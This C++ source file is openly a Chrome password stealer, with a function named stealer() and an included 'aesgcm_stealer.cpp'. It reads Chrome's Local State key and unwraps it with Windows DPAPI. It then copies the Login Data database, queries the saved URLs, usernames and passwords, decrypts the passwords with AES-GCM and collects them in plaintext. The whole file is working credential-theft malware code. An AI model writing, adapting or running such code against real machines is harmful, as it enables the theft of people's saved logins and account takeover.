#include <filesystem>
#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <string>
#include <iostream>
#include <wincrypt.h>
#include <stdio.h>
#include <vector>
#include <iostream>
#include <cstring>
#include <fstream>
#include <sstream>
#include "base64.cpp"
#include "sqlite3.h"
#include "aesgcm_stealer.cpp"

std::string get_chrome_localstate()
{
    char *userpath = getenv("USERPROFILE");
    std::string path;
    if (userpath != nullptr)
        path = std::string(userpath) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    else
        std::cout << "No user path";

    std::ifstream readFile;

    readFile.open(path); // open localstate file
    std::string sdata;
    if (!readFile.fail())
    {
        std::stringstream streambuffer;
        streambuffer << readFile.rdbuf();
        sdata = streambuffer.str();
        readFile.close();

        // std::cout<<sdata<<std::endl;
    }

    return sdata;
}

std::string get_encryptedkey(std::string s)
{
    std::string s1 = "\"encrypted_key\":\"";
    std::string s2 = "\"}";
    int start = s.find(s1) + s1.length();
    int tail = s.find(s2, start);
    std::string key = s.substr(start, tail - start);
    // std::cout << key << std::endl;

    return key;
}

void print_hex(BYTE *data, size_t dataLen)
{
    for (size_t i = 0; i < dataLen; i++)
    {
        printf("%02x ", data[i]);
    }
    printf("\n");
}

std::string decrypt_password(std::string encrypted_pass, BYTE *key)
{
    /*BYTE key_256[256];
    for (int i = 0; i < 256; i++)
    {
        key_256[i] = key[i];
    }*/
    auto cipher = new AESGCM_STEALER(key);
    std::string iv_string = encrypted_pass.substr(3,12);
    std::vector<uint8_t> iv_vec(iv_string.begin(), iv_string.end());
    BYTE *iv = &iv_vec[0];

    std::string cipher_string = encrypted_pass.substr(15);
    std::vector<uint8_t> ciphertext_vec(cipher_string.begin(), cipher_string.end() - 16);
    BYTE *ciphertext = &ciphertext_vec[0];
    
    std::vector<uint8_t> tag_vec(cipher_string.end() - 16, cipher_string.end());
    BYTE *tag = &tag_vec[0];

    // printf("Attempting decryption...\n");
    cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());

    // char* pt = new char[cipher->ptBufferSize+1];
    /*for (int i = 0; i < cipher->ptBufferSize; i++)
    {
        printf("%c", (char)cipher->plaintext[i]);

    }
    printf("\n");
    */

    char* p = new char[cipher->ptBufferSize];
    memcpy(p,cipher->plaintext,cipher->ptBufferSize);
    p[cipher->ptBufferSize] = 0;
    std::string str(p);

    //std::cout<<p<<std::endl;
    delete cipher;

    return p;
}

LPCWSTR stringToLPCWSTR(std::string orig)
{
    wchar_t *wcstring = 0;
    try
    {
        size_t origsize = orig.length() + 1;
        const size_t newsize = 100;
        size_t convertedChars = 0;
        if (orig == "")
        {
            wcstring = (wchar_t *)malloc(0);
            mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
        }
        else
        {
            wcstring = (wchar_t *)malloc(sizeof(wchar_t) * (orig.length() - 1));
            mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
        }
    }
    catch (std::exception e)
    {
    }
    return wcstring;
}

std::string stealer()
{

    std::string return_string = ""; 
    std::string localstate = get_chrome_localstate();

    std::string base64_key = get_encryptedkey(localstate);
    std::cout << base64_key << std::endl;

    std::vector<uint8_t> key = b64Decode(base64_key);
    std::string str_key(key.begin(), key.end());

    str_key = str_key.substr(5);
    std::cout << str_key << std::endl;
    std::cout << str_key.length() << std::endl;


    int i;
    size_t len = str_key.length();
    BYTE result[1000] = "";
    DATA_BLOB DataOut = {0};
    DATA_BLOB DataVerify = {0};
    DataOut.pbData = (BYTE *)str_key.c_str();
    DataOut.cbData = len;
    if (!CryptUnprotectData(&DataOut, nullptr, NULL, NULL, NULL, 0, &DataVerify))
    {
        printf("[!] Decryption failure: %d\n", GetLastError());
    }
    else
    {
        printf("[+] Decryption successfully!\n");
        for (i = 0; i < DataVerify.cbData; i++)
        {
            result[i] = DataVerify.pbData[i];
        }
    }
    std::cout << result << std::endl;
    std::cout << len << std::endl;

    char *user_path = getenv("USERPROFILE");
    std::string chrome_db_path;
    if (user_path != nullptr)
        chrome_db_path = std::string(user_path) + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
    else{
        std::cout << "No user path";
    }
    std::string filename = "Login Data.db";

    CopyFileA(chrome_db_path.c_str(), filename.c_str(), FALSE);

    sqlite3 *chrome_db;
    if (sqlite3_open(filename.c_str(), &chrome_db) != 0)
    {
        printf("Can't open database... %s\n", sqlite3_errmsg(chrome_db));
        sqlite3_close(chrome_db);
        return "Can't open database... ";
    }


    // https://blog.csdn.net/weixin_30696427/article/details/97547260?spm=1001.2101.3001.6650.11&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&utm_relevant_index=16
    sqlite3_stmt *stmt; 
    const char *sqlSentence = "SELECT origin_url, username_value, password_value FROM logins";
    int db_result = sqlite3_prepare_v2(chrome_db, sqlSentence, -1, &stmt, NULL);
    if (db_result == SQLITE_OK){
        while (sqlite3_step(stmt) == SQLITE_ROW)
        {
            const unsigned char *origin_url = sqlite3_column_text(stmt, 0);
            const unsigned char *username_value = sqlite3_column_text(stmt, 1);
            const unsigned char *password_value = sqlite3_column_text(stmt, 2);
            //printf("--------------------------------\n");

            //printf("Origin URL: %s\n", origin_url);
            std::string s1 = "Origin URL: "; 
            std::string s2 = "Username: ";
            std::string s3 = "Password: ";
            std::string s4 =  "\n";
            std::string s5 = "--------------------------------\n";
            std::string string_url = reinterpret_cast<const char*>(origin_url);
            std::string string_user = reinterpret_cast<const char*>(username_value);
            
            
            //printf("Username: %s\n", username_value);

            const char *char_pass = reinterpret_cast<const char *>(password_value);
            std::string string_pass = char_pass;
            std::string str_pass(char_pass);
            std::string string_password;
            try
            {
                string_password = decrypt_password(str_pass, result);
                
            }
            catch (const std::exception &e)
            {
                std::cout << e.what() << std::endl;
            }

            return_string.append(s5);
            return_string.append(s1+string_url+s4);
            return_string.append(s2+string_user+s4);
            return_string.append(s3+string_password+s4);
            
            
        }
    }
    else{
            printf("SQL statement preparation failed... %s\n", sqlite3_errmsg(chrome_db));
            sqlite3_finalize(stmt);
            sqlite3_close(chrome_db);
            return "SQL statement preparation failed...";
        
        }

    sqlite3_finalize(stmt);
    sqlite3_close(chrome_db);
    
        

        return return_string;

        
}


